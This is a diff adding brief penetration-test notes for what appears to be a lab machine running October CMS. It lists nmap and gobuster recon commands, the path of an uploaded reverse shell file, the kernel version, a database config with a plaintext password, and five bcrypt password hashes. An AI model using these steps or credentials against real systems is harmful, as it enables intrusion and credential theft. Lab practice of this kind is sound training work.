@@ -1,0 +1,29 @@
+nmap -sV -sC -Pn 10.129.137.53 > nmap.txt
+nmap -p- 10.129.137.152 > nmapall.txt
+gobuster dir  -u http://10.129.137.152/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobuster.txt
+
+
+
+http://10.129.137.152/storage/app/media/reverse.php5
+
+
+Linux version 4.4.0-78-generic (buildd@lcy01-35) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #99~14.04.2-Ubuntu SMP Thu Apr 27 18:51:25 UTC 2017
+
+
+mysql -uoctober -p
+
+'mysql' => [
+    'driver'    => 'mysql',
+    'host'      => 'localhost',
+    'port'      => '',
+    'database'  => 'october',
+    'username'  => 'october',
+    'password'  => 'OctoberCMSPassword!!',
+    'charset'   => 'utf8',
+    'collation' => 'utf8_unicode_ci',
+    'prefix'    => '',
+$2y$10$4BjH4v.qVfYdQvQDE92D1.WeEeDKk/KnF7o0tmwQGHsNYoKsuomZO
+$2y$10$osIpPHjAEF93srSsntD24.P8Rji0PNzbOLz6YtgRKXAcqAPgaH.LW
+$2y$10$4tBYxIpkBpR9.coxVUdeJetCp77EFLp1U2o/f2.wlKaBbe698aIzO
+$2y$10$ozRr2QHKXLJXx/n.rhQO6.2PxEeNXywYozigkq5NrH7TRBLzqrzUG
+$2y$10$SxQFwenHehdTACqlHbGRQ.DKBeg5a9K5BP8QkwB2MQ.XdWOxefBvW
